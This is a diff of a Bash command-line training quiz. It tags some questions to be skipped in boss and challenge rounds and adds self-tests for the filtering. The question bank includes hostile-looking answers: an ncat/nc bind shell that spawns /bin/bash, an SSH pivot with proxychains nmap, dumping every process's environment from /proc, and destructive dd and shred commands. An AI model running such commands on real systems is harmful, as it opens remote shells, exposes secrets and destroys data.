   questions+=("Watch for new connections in realtime|watch -n1 'ss -tn state established'|watch -n 1 'ss -tn state established'|watch -n1 'ss -tnp state established'|watch -n 1 'ss -tnp state established'")
   questions+=("Monitor file changes in directory|inotifywait -m -r ${dir}/|inotifywait -m -r ${dir}|inotifywait -mr ${dir}/|inotifywait -mr ${dir}|inotifywait --monitor --recursive ${dir}/|inotifywait --monitor --recursive ${dir}|inotifywait --monitor -r ${dir}/|inotifywait -m --recursive ${dir}/|inotifywait --monitor -r ${dir}|inotifywait -m --recursive ${dir}")
   questions+=("Parallel compress all logs§find /var/log -name '*.log' | parallel gzip§find /var/log -name '*.log' | xargs gzip§find /var/log -name '*.log' -exec gzip {} +§find /var/log -name '*.log' -exec gzip {} \\;§sudo find /var/log -name '*.log' | parallel gzip§sudo find /var/log -name '*.log' | xargs gzip§sudo find /var/log -name '*.log' -exec gzip {} +§sudo find /var/log -name '*.log' -exec gzip {} \\;")
-  questions+=("Find duplicate files by hash§find . -type f -exec md5sum {} + | sort | uniq -d -w32§find . -type f -exec md5sum {} \; | sort | uniq -d -w32§find . -type f -exec sha256sum {} + | sort | uniq -d -w64")
-  questions+=("Extract all IPs from logs, count, sort§grep -rohE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' /var/log/* | sort | uniq -c | sort -rn | head§grep -roE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' /var/log/* | sort | uniq -c | sort -rn | head§egrep -roh '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' /var/log/* | sort | uniq -c | sort -rn | head§egrep -ro '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' /var/log/* | sort | uniq -c | sort -rn | head§sudo grep -rohE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' /var/log/* | sort | uniq -c | sort -rn | head§sudo grep -roE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' /var/log/* | sort | uniq -c | sort -rn | head")
+  questions+=("Find duplicate files by hash§find . -type f -exec md5sum {} + | sort | uniq -d -w32§find . -type f -exec md5sum {} \; | sort | uniq -d -w32§find . -type f -exec sha256sum {} + | sort | uniq -d -w64#chal-skip")
+  questions+=("Extract all IPs from logs, count, sort§grep -rohE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' /var/log/* | sort | uniq -c | sort -rn | head§grep -roE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' /var/log/* | sort | uniq -c | sort -rn | head§egrep -roh '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' /var/log/* | sort | uniq -c | sort -rn | head§egrep -ro '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' /var/log/* | sort | uniq -c | sort -rn | head§sudo grep -rohE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' /var/log/* | sort | uniq -c | sort -rn | head§sudo grep -roE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' /var/log/* | sort | uniq -c | sort -rn | head#boss-skip#chal-skip")
   questions+=("Emergency disk space cleanup|find /var/log -name '*.gz' -mtime +7 -delete|find /var/log -name '*.gz' -mtime +7 -exec rm {} +|find /var/log -name '*.gz' -mtime +7 -exec rm {} \;")
   questions+=("Find recently modified system files|find /etc -mmin -60 -type f 2>/dev/null|find /etc -type f -mmin -60 2>/dev/null")
   questions+=("From ${W}ss -tlpn${C} output, print local address (col 4) and process (col 6)§ss -tlpn | awk 'NR>1 {print \$4, \$6}'§ss -tlpn | awk 'NR>1{print \$4,\$6}'§ss -tlpn | tail -n +2 | awk '{print \$4, \$6}'§ss -tlpn | tail -n +2 | awk '{print \$4,\$6}'")
@@ -2599,14 +2603,14 @@ gen_level30() {
   questions+=("Test if ${W}${ip}${C} is up via port 22 (no ping)|timeout 1 bash -c \"echo >/dev/tcp/${ip}/22\" && echo up|nc -zw1 ${ip} 22|nc -z -w 1 ${ip} 22|nc -zw 1 ${ip} 22")
   questions+=("Bind shell with ncat|ncat -lvnp ${port} -e /bin/bash|ncat -nlvp ${port} -e /bin/bash|ncat -lvnp ${port} -e /bin/sh|ncat -nlvp ${port} -e /bin/sh|ncat -lvnp ${port} -e bash|ncat -nlvp ${port} -e bash|ncat -lvnp ${port} -e sh|ncat -nlvp ${port} -e sh|nc -lvnp ${port} -e /bin/bash|nc -nlvp ${port} -e /bin/bash|nc -lvnp ${port} -e /bin/sh|nc -nlvp ${port} -e /bin/sh")
   questions+=("Encrypted listener (openssl s_server, quiet) on port ${W}${port}${C} using ${W}key.pem${C} + ${W}cert.pem${C}|openssl s_server -quiet -key key.pem -cert cert.pem -port ${port}|openssl s_server -quiet -cert cert.pem -key key.pem -port ${port}|openssl s_server -key key.pem -cert cert.pem -quiet -port ${port}|openssl s_server -cert cert.pem -key key.pem -quiet -port ${port}|openssl s_server -key key.pem -cert cert.pem -port ${port} -quiet|openssl s_server -cert cert.pem -key key.pem -port ${port} -quiet|openssl s_server -quiet -key key.pem -cert cert.pem -accept ${port}|openssl s_server -quiet -cert cert.pem -key key.pem -accept ${port}")
-  questions+=("Pivot through host (proxychains setup)§ssh -D 9050 ${user}@${host} -fN && proxychains nmap ${ip}§ssh -D 9050 ${user}@${host} -fN; proxychains nmap ${ip}§ssh -D 9050 ${user}@${host} -fN && proxychains4 nmap ${ip}§ssh -D 9050 ${user}@${host} -fN; proxychains4 nmap ${ip}")
+  questions+=("Pivot through host (proxychains setup)§ssh -D 9050 ${user}@${host} -fN && proxychains nmap ${ip}§ssh -D 9050 ${user}@${host} -fN; proxychains nmap ${ip}§ssh -D 9050 ${user}@${host} -fN && proxychains4 nmap ${ip}§ssh -D 9050 ${user}@${host} -fN; proxychains4 nmap ${ip}#boss-skip#chal-skip")
   questions+=("List all cron jobs system-wide|crontab -l; cat /etc/crontab; ls /etc/cron.d/|crontab -l && cat /etc/crontab && ls /etc/cron.d/|crontab -l; cat /etc/crontab; ls /etc/cron.d|crontab -l && cat /etc/crontab && ls /etc/cron.d")
   questions+=("Find files owned by nobody/nogroup|find / -nouser -o -nogroup 2>/dev/null|find / -nouser -or -nogroup 2>/dev/null")
   questions+=("List all users with shell access§grep -vE 'nologin|false' /etc/passwd§grep -v -E 'nologin|false' /etc/passwd§egrep -v 'nologin|false' /etc/passwd§grep --invert-match -E 'nologin|false' /etc/passwd§rg -v 'nologin|false' /etc/passwd§rg --invert-match 'nologin|false' /etc/passwd")
   questions+=("Show failed login attempts§journalctl _COMM=sshd | grep -iE 'failed|invalid'§grep 'Failed' /var/log/auth.log§journalctl -u sshd | grep -iE 'failed|invalid'§journalctl -u ssh | grep -iE 'failed|invalid'§journalctl _COMM=sshd | egrep -i 'failed|invalid'§journalctl -u sshd | egrep -i 'failed|invalid'§journalctl -u ssh | egrep -i 'failed|invalid'§lastb§sudo lastb§grep Failed /var/log/auth.log§grep -i failed /var/log/auth.log§journalctl _COMM=sshd | rg -i 'failed|invalid'§journalctl -u sshd | rg -i 'failed|invalid'§rg -i 'failed|invalid' /var/log/auth.log§rg -i failed /var/log/auth.log")
   questions+=("Find hidden files in home dirs|find /home -name '.*' -type f 2>/dev/null|find /home -type f -name '.*' 2>/dev/null")
   questions+=("Check for rootkits|chkrootkit|rkhunter --check|rkhunter -c|sudo chkrootkit|sudo rkhunter --check|sudo rkhunter -c")
-  questions+=("Dump environment of EVERY running process§cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n'§sudo cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n'§grep -azh '' /proc/*/environ 2>/dev/null | tr '\\0' '\\n'§sudo grep -azh '' /proc/*/environ 2>/dev/null | tr '\\0' '\\n'")
+  questions+=("Dump environment of EVERY running process§cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n'§sudo cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n'§grep -azh '' /proc/*/environ 2>/dev/null | tr '\\0' '\\n'§sudo grep -azh '' /proc/*/environ 2>/dev/null | tr '\\0' '\\n'#chal-skip")
   questions+=("Trace system calls of ${W}${proc}${C}|strace -p \$(pgrep -f ${proc})|strace -fp \$(pgrep -f ${proc})|sudo strace -p \$(pgrep -f ${proc})|sudo strace -fp \$(pgrep -f ${proc})|strace -p \$(pidof ${proc})|strace -fp \$(pidof ${proc})|sudo strace -p \$(pidof ${proc})|sudo strace -fp \$(pidof ${proc})|strace -p \$(pgrep ${proc})|sudo strace -p \$(pgrep ${proc})")
   questions+=("Find processes with deleted binaries§ls -la /proc/*/exe 2>/dev/null | grep deleted§ls -l /proc/*/exe 2>/dev/null | grep deleted§ls -la /proc/*/exe 2>/dev/null | rg deleted§ls -l /proc/*/exe 2>/dev/null | rg deleted")
   questions+=("Memory dump of ${W}${proc}${C}|gcore -o dump \$(pgrep -f ${proc})|sudo gcore -o dump \$(pgrep -f ${proc})|gcore -o dump \$(pidof ${proc})|sudo gcore -o dump \$(pidof ${proc})")
@@ -2627,30 +2631,30 @@ gen_level30() {
   questions+=("Check disk health (SMART)|smartctl -a /dev/sda|smartctl --all /dev/sda|sudo smartctl -a /dev/sda|sudo smartctl --all /dev/sda|smartctl -H /dev/sda|sudo smartctl -H /dev/sda")
   questions+=("Shred ${W}${txt}${C}: 3 passes, verbose, force, zero-fill after|shred -vfz -n 3 ${txt}|shred -n 3 -vfz ${txt}|shred --verbose --force --zero -n 3 ${txt}|shred --verbose --force --zero --iterations=3 ${txt}|shred --verbose --force --zero --iterations 3 ${txt}")
   questions+=("Create 512M RAM disk (tmpfs) at /mnt/ramdisk|mount -t tmpfs -o size=512M tmpfs /mnt/ramdisk|sudo mount -t tmpfs -o size=512M tmpfs /mnt/ramdisk")
-  questions+=("Clone /dev/sda TO /dev/sdb with progress (overwrites destination)|dd if=/dev/sda of=/dev/sdb bs=64K status=progress conv=noerror,sync|dd bs=64K if=/dev/sda of=/dev/sdb status=progress conv=noerror,sync|dd if=/dev/sda bs=64K of=/dev/sdb status=progress conv=noerror,sync|sudo dd if=/dev/sda of=/dev/sdb bs=64K status=progress conv=noerror,sync|sudo dd bs=64K if=/dev/sda of=/dev/sdb status=progress conv=noerror,sync|sudo dd if=/dev/sda bs=64K of=/dev/sdb status=progress conv=noerror,sync|dd if=/dev/sda of=/dev/sdb bs=64K status=progress conv=sync,noerror|dd bs=64K if=/dev/sda of=/dev/sdb status=progress conv=sync,noerror|dd if=/dev/sda bs=64K of=/dev/sdb status=progress conv=sync,noerror|sudo dd if=/dev/sda of=/dev/sdb bs=64K status=progress conv=sync,noerror|sudo dd bs=64K if=/dev/sda of=/dev/sdb status=progress conv=sync,noerror|sudo dd if=/dev/sda bs=64K of=/dev/sdb status=progress conv=sync,noerror")
+  questions+=("Clone /dev/sda TO /dev/sdb with progress (overwrites destination)|dd if=/dev/sda of=/dev/sdb bs=64K status=progress conv=noerror,sync|dd bs=64K if=/dev/sda of=/dev/sdb status=progress conv=noerror,sync|dd if=/dev/sda bs=64K of=/dev/sdb status=progress conv=noerror,sync|sudo dd if=/dev/sda of=/dev/sdb bs=64K status=progress conv=noerror,sync|sudo dd bs=64K if=/dev/sda of=/dev/sdb status=progress conv=noerror,sync|sudo dd if=/dev/sda bs=64K of=/dev/sdb status=progress conv=noerror,sync|dd if=/dev/sda of=/dev/sdb bs=64K status=progress conv=sync,noerror|dd bs=64K if=/dev/sda of=/dev/sdb status=progress conv=sync,noerror|dd if=/dev/sda bs=64K of=/dev/sdb status=progress conv=sync,noerror|sudo dd if=/dev/sda of=/dev/sdb bs=64K status=progress conv=sync,noerror|sudo dd bs=64K if=/dev/sda of=/dev/sdb status=progress conv=sync,noerror|sudo dd if=/dev/sda bs=64K of=/dev/sdb status=progress conv=sync,noerror#chal-skip")
   questions+=("Random string generator§tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 32§cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 32§openssl rand -hex 16§openssl rand -base64 24")
-  questions+=("Parallel curl on URLs from ${W}urls.txt${C} (10 jobs)§cat urls.txt | xargs -P 10 -I{} curl -s {}§cat urls.txt | xargs -P 10 -I {} curl -s {}§xargs -P 10 -I{} curl -s {} < urls.txt§xargs -P 10 -I {} curl -s {} < urls.txt")
+  questions+=("Parallel curl on URLs from ${W}urls.txt${C} (10 jobs)§cat urls.txt | xargs -P 10 -I{} curl -s {}§cat urls.txt | xargs -P 10 -I {} curl -s {}§xargs -P 10 -I{} curl -s {} < urls.txt§xargs -P 10 -I {} curl -s {} < urls.txt#chal-skip")
   questions+=("Use flock on fd 200 (/tmp/lock) to prevent concurrent script runs§exec 200>/tmp/lock; flock -n 200 || exit 1§exec 200>/tmp/lock && flock -n 200 || exit 1")
-  questions+=("Create a named pipe (FIFO) at ${W}/tmp/pipe${C} and use it|mkfifo /tmp/pipe; cmd1 > /tmp/pipe & cmd2 < /tmp/pipe|mkfifo /tmp/pipe && cmd1 > /tmp/pipe & cmd2 < /tmp/pipe")
+  questions+=("Create a named pipe (FIFO) at ${W}/tmp/pipe${C} and use it|mkfifo /tmp/pipe; cmd1 > /tmp/pipe & cmd2 < /tmp/pipe|mkfifo /tmp/pipe && cmd1 > /tmp/pipe & cmd2 < /tmp/pipe#chal-skip")
   questions+=("Encrypt ${W}${txt}${C} for offline transport|gpg -c --cipher-algo AES256 ${txt}|gpg --symmetric --cipher-algo AES256 ${txt}|gpg -c ${txt}|gpg --symmetric ${txt}|gpg2 -c --cipher-algo AES256 ${txt}|gpg2 --symmetric --cipher-algo AES256 ${txt}|gpg2 -c ${txt}|gpg2 --symmetric ${txt}")
-  questions+=("Trace every execve system-wide with bpftrace|bpftrace -e 'tracepoint:syscalls:sys_enter_execve { printf(\"%s %s\\n\", comm, str(args->filename)); }'|sudo bpftrace -e 'tracepoint:syscalls:sys_enter_execve { printf(\"%s %s\\n\", comm, str(args->filename)); }'")
+  questions+=("Trace every execve system-wide with bpftrace|bpftrace -e 'tracepoint:syscalls:sys_enter_execve { printf(\"%s %s\\n\", comm, str(args->filename)); }'|sudo bpftrace -e 'tracepoint:syscalls:sys_enter_execve { printf(\"%s %s\\n\", comm, str(args->filename)); }'#boss-skip#chal-skip")
   questions+=("Stream live kernel messages|dmesg -w|dmesg --follow|dmesg -W|sudo dmesg -w|sudo dmesg --follow|sudo dmesg -W")
   questions+=("Load kernel module ${W}nf_conntrack${C}|modprobe nf_conntrack|sudo modprobe nf_conntrack|modprobe -v nf_conntrack|sudo modprobe -v nf_conntrack")
-  questions+=("Enter network namespace of ${W}${proc}${C}|nsenter -t \$(pidof ${proc}) -n|nsenter --target \$(pidof ${proc}) --net|sudo nsenter -t \$(pidof ${proc}) -n|sudo nsenter --target \$(pidof ${proc}) --net|nsenter -t \$(pgrep -f ${proc}) -n|sudo nsenter -t \$(pgrep -f ${proc}) -n")
+  questions+=("Enter network namespace of ${W}${proc}${C}|nsenter -t \$(pidof ${proc}) -n|nsenter --target \$(pidof ${proc}) --net|sudo nsenter -t \$(pidof ${proc}) -n|sudo nsenter --target \$(pidof ${proc}) --net|nsenter -t \$(pgrep -f ${proc}) -n|sudo nsenter -t \$(pgrep -f ${proc}) -n#boss-skip")
   questions+=("Create and enter new network namespace 'testns'|ip netns add testns && ip netns exec testns bash|sudo ip netns add testns && sudo ip netns exec testns bash|ip netns add testns; ip netns exec testns bash|sudo ip netns add testns; sudo ip netns exec testns bash")
   questions+=("Capture HTTP traffic on any interface (ASCII)|tcpdump -i any -nn -A 'tcp port 80'|sudo tcpdump -i any -nn -A 'tcp port 80'|tcpdump -i any -nn -A port 80|sudo tcpdump -i any -nn -A port 80")
   questions+=("Audit watch on /etc/passwd (writes + attrs)|auditctl -w /etc/passwd -p wa -k passwd_watch|sudo auditctl -w /etc/passwd -p wa -k passwd_watch|auditctl -w /etc/passwd -p wa|sudo auditctl -w /etc/passwd -p wa")
   questions+=("Follow logs for ${W}${proc}${C} live|journalctl -fu ${proc}|journalctl -f -u ${proc}|sudo journalctl -fu ${proc}|sudo journalctl -f -u ${proc}|journalctl --follow --unit ${proc}|sudo journalctl --follow --unit ${proc}")
-  questions+=("Sample CPU stacks of ${W}${proc}${C} at 99 Hz for 10s (perf)|perf record -F 99 -p \$(pgrep -f ${proc}) -g -- sleep 10|sudo perf record -F 99 -p \$(pgrep -f ${proc}) -g -- sleep 10|perf record -F 99 -p \$(pidof ${proc}) -g -- sleep 10|sudo perf record -F 99 -p \$(pidof ${proc}) -g -- sleep 10")
+  questions+=("Sample CPU stacks of ${W}${proc}${C} at 99 Hz for 10s (perf)|perf record -F 99 -p \$(pgrep -f ${proc}) -g -- sleep 10|sudo perf record -F 99 -p \$(pgrep -f ${proc}) -g -- sleep 10|perf record -F 99 -p \$(pidof ${proc}) -g -- sleep 10|sudo perf record -F 99 -p \$(pidof ${proc}) -g -- sleep 10#boss-skip#chal-skip")
   questions+=("List all loaded eBPF programs|bpftool prog list|sudo bpftool prog list|bpftool prog show|sudo bpftool prog show")
   questions+=("Print current process capability sets (bounding, permitted, effective)|capsh --print|sudo capsh --print|capsh --decode=\$(grep ^CapEff /proc/self/status | awk '{print \$2}')")
   questions+=("Spawn unprivileged shell in new user+UTS+net namespaces|unshare -Uurn /bin/bash|unshare -Uurn bash|unshare -Uurn /bin/sh|unshare --user --uts --net --map-root-user /bin/bash|unshare --user --uts --net --map-root-user bash")
   questions+=("List tracked connections (conntrack table)|conntrack -L|sudo conntrack -L|conntrack -L -o timestamp|sudo conntrack -L -o timestamp")
   questions+=("Per-device extended I/O stats, skip idle, 1s interval|iostat -xz 1|iostat -x 1|sudo iostat -xz 1|sudo iostat -x 1")
   questions+=("Per-unit boot time, slowest first (systemd-analyze)|systemd-analyze blame|sudo systemd-analyze blame")
-  questions+=("Attach gdb to ${W}${proc}${C}, dump memory map, detach§gdb -p \$(pgrep -f ${proc}) -ex 'info proc mappings' -ex detach -ex quit§sudo gdb -p \$(pgrep -f ${proc}) -ex 'info proc mappings' -ex detach -ex quit§gdb -p \$(pidof ${proc}) -ex 'info proc mappings' -ex detach -ex quit§sudo gdb -p \$(pidof ${proc}) -ex 'info proc mappings' -ex detach -ex quit")
+  questions+=("Attach gdb to ${W}${proc}${C}, dump memory map, detach§gdb -p \$(pgrep -f ${proc}) -ex 'info proc mappings' -ex detach -ex quit§sudo gdb -p \$(pgrep -f ${proc}) -ex 'info proc mappings' -ex detach -ex quit§gdb -p \$(pidof ${proc}) -ex 'info proc mappings' -ex detach -ex quit§sudo gdb -p \$(pidof ${proc}) -ex 'info proc mappings' -ex detach -ex quit#boss-skip#chal-skip")
   questions+=("Show virtual memory regions of ${W}${proc}${C} (heap, stack, mapped)|cat /proc/\$(pgrep -f ${proc})/maps|sudo cat /proc/\$(pgrep -f ${proc})/maps|cat /proc/\$(pidof ${proc})/maps|sudo cat /proc/\$(pidof ${proc})/maps|pmap \$(pgrep -f ${proc})|sudo pmap \$(pgrep -f ${proc})")
-  questions+=("Inject 100ms latency + 5% loss on ${W}${iface}${C} with tc netem|tc qdisc add dev ${iface} root netem delay 100ms loss 5%|sudo tc qdisc add dev ${iface} root netem delay 100ms loss 5%")
+  questions+=("Inject 100ms latency + 5% loss on ${W}${iface}${C} with tc netem|tc qdisc add dev ${iface} root netem delay 100ms loss 5%|sudo tc qdisc add dev ${iface} root netem delay 100ms loss 5%#chal-skip")
   questions+=("List active live-kernel patches|kpatch list|sudo kpatch list|cat /sys/kernel/livepatch/*/enabled 2>/dev/null|ls /sys/kernel/livepatch/")
   questions+=("Soft-reboot into staged kernel via kexec (no BIOS)|kexec -e|sudo kexec -e|kexec --exec|sudo kexec --exec")
   questions+=("Activate all LVM volume groups|vgchange -ay|sudo vgchange -ay|vgchange --activate y|sudo vgchange --activate y")
@@ -2869,7 +2873,7 @@ Fix log level to INFO§sed -i 's/level=DEBUG/level=INFO/' config.ini§sed -i 's/
 STEPS
 }
 
-declare -A _LEVEL_CACHE=() _LEVEL_CACHE_N=() _LEVEL_ITEMS=() _LAST_PICK=()
+declare -A _LEVEL_CACHE=() _LEVEL_CACHE_N=() _LEVEL_ITEMS=() _LAST_PICK=() _LEVEL_CHAL=()
 
 declare -a CURRENT_QUESTIONS=()
 generate_level() {
@@ -3591,6 +3595,14 @@ run() {
   while IFS= read -r _line; do
     [[ -n "$_line" ]] && _cur_q+=("$_line")
   done <<< "${_LEVEL_CACHE[$lv]}"
+  # Filter #boss-skip prompts (too obscure for no-manpage boss memory drill);
+  # only swap if enough remain to fill the round.
+  local _filt_q=()
+  for q in "${_cur_q[@]}"; do
+    _qparse "$q"
+    ((_qboss_skip)) || _filt_q+=("$q")
+  done
+  ((${#_filt_q[@]} >= boss_total)) && _cur_q=("${_filt_q[@]}")
   local -A _seen_map; for s in "${SEEN_PROMPTS[@]}"; do _seen_map[$s]=1; done
   for q in "${_cur_q[@]}"; do
     _qparse "$q"
@@ -3698,9 +3710,30 @@ _pick_q() {
     local IFS=$'\n'; _LEVEL_CACHE[$1]="${_pqtmp[*]}"
   fi
   local _n=${_LEVEL_CACHE_N[$1]}; ((_n)) || return 1
-  local _idx=$((RANDOM % _n))
-  if ((_n > 1)) && [[ "${_LAST_PICK[$1]:-}" == "$_idx" ]]; then
-    _idx=$(( (_idx + 1) % _n ))
+  local _idx
+  if [[ "${2:-}" == challenge ]]; then
+    if [[ -z "${_LEVEL_CHAL[$1]:-}" ]]; then
+      local _ci="" _i
+      for ((_i=0; _i<_n; _i++)); do
+        _qparse "${_LEVEL_ITEMS[$1:$_i]}"
+        ((_qboss_skip || _qchal_skip)) || _ci+="$_i "
+      done
+      _LEVEL_CHAL[$1]="${_ci% }"
+    fi
+    local _chal_arr=()
+    IFS=' ' read -ra _chal_arr <<< "${_LEVEL_CHAL[$1]}"
+    local _cn=${#_chal_arr[@]}
+    ((_cn == 0)) && return 1
+    local _pick=$((RANDOM % _cn))
+    if ((_cn > 1)) && [[ "${_LAST_PICK[$1]:-}" == "${_chal_arr[$_pick]}" ]]; then
+      _pick=$(( (_pick + 1) % _cn ))
+    fi
+    _idx=${_chal_arr[$_pick]}
+  else
+    _idx=$((RANDOM % _n))
+    if ((_n > 1)) && [[ "${_LAST_PICK[$1]:-}" == "$_idx" ]]; then
+      _idx=$(( (_idx + 1) % _n ))
+    fi
   fi
   _LAST_PICK[$1]=$_idx
   _qparse "${_LEVEL_ITEMS[$1:$_idx]}"
@@ -3718,7 +3751,7 @@ challenge() {
 
   while true; do
     local pick_lv=$((RANDOM % MAX_LEVEL + 1))
-    _pick_q "$pick_lv" || continue; local prompt=$_qprompt ans=$_qans
+    _pick_q "$pick_lv" challenge || continue; local prompt=$_qprompt ans=$_qans
 
     _REDRAW_HDR() {
       local _t=20
@@ -4107,6 +4140,20 @@ _selftest() {
   _assert "qparse require" "$_qrequire" "a:b:c"
   _assert "qparse require output" "$_qoutput" "~^a$"
   _assert "qparse require prompt" "$_qprompt" "Cut field"
+  _qparse "Boss skip|cmd1#boss-skip"
+  _assert "qparse boss-skip flag" "$_qboss_skip" "1"
+  _assert "qparse boss-skip prompt" "$_qprompt" "Boss skip"
+  _assert "qparse boss-skip ans" "$_qans" "cmd1"
+  _qparse "Chal skip|cmd1#chal-skip#output:foo"
+  _assert "qparse chal-skip flag" "$_qchal_skip" "1"
+  _assert "qparse chal-skip output preserved" "$_qoutput" "foo"
+  _assert "qparse chal-skip prompt" "$_qprompt" "Chal skip"
+  _qparse "Both tags|cmd1#boss-skip#chal-skip"
+  _assert "qparse both flags boss" "$_qboss_skip" "1"
+  _assert "qparse both flags chal" "$_qchal_skip" "1"
+  _qparse "No tags|cmd1"
+  _assert "qparse no tags boss" "$_qboss_skip" "0"
+  _assert "qparse no tags chal" "$_qchal_skip" "0"
 
   printf '%s\n' "${B}=== vi handler ===${N}"
   # Test harness: set up shared vars, call _vi_normal with c=KEY, check result
@@ -4312,6 +4359,41 @@ _selftest() {
       ((_pass++))
     fi
   done
+
+  printf '%s\n' "${B}=== challenge filter ===${N}"
+  local _trials_per_lv=200 _trial _tagged_drawn=0 _untagged_drawn=0
+  for _lv in 26 27 28 29 30; do
+    unset "_LEVEL_CHAL[$_lv]"
+    for ((_trial=0; _trial<_trials_per_lv; _trial++)); do
+      _pick_q "$_lv" challenge || continue
+      if ((_qboss_skip || _qchal_skip)); then ((_tagged_drawn++)); else ((_untagged_drawn++)); fi
+    done
+  done
+  _assert "challenge filter excludes all tagged prompts (1000 draws)" "$_tagged_drawn" "0"
+  if ((_untagged_drawn < 900)); then
+    ((_fail++)); printf '  FAIL: challenge filter only drew %d/1000 untagged prompts\n' "$_untagged_drawn"
+  else
+    ((_pass++))
+  fi
+
+  printf '%s\n' "${B}=== boss filter ===${N}"
+  local _bf_total=0 _bf_boss_tagged=0
+  for _lv in 26 27 28 29 30; do
+    local _bf_q=()
+    local _OLD_IFS=$IFS; IFS=$'\n'; _bf_q=(${_LEVEL_CACHE[$_lv]}); IFS=$_OLD_IFS
+    for q in "${_bf_q[@]}"; do
+      [[ -n "$q" ]] || continue
+      ((_bf_total++))
+      _qparse "$q"
+      ((_qboss_skip)) && ((_bf_boss_tagged++))
+    done
+  done
+  if ((_bf_boss_tagged >= 20)); then
+    ((_pass++))
+  else
+    ((_fail++)); printf '  FAIL: boss filter found only %d boss-skip prompts in L26-30 (expected >= 20)\n' "$_bf_boss_tagged"
+  fi
+  _assert "boss filter sees post-tag pool" "$((_bf_total > 100))" "1"
 
   printf '\n%s%s%d passed%s, ' "$B" "$G" "$_pass" "$N"
   ((_fail)) && printf '%s%s%d failed%s\n' "$B" "$R" "$_fail" "$N" || printf '%s0 failed%s\n' "$D" "$N"
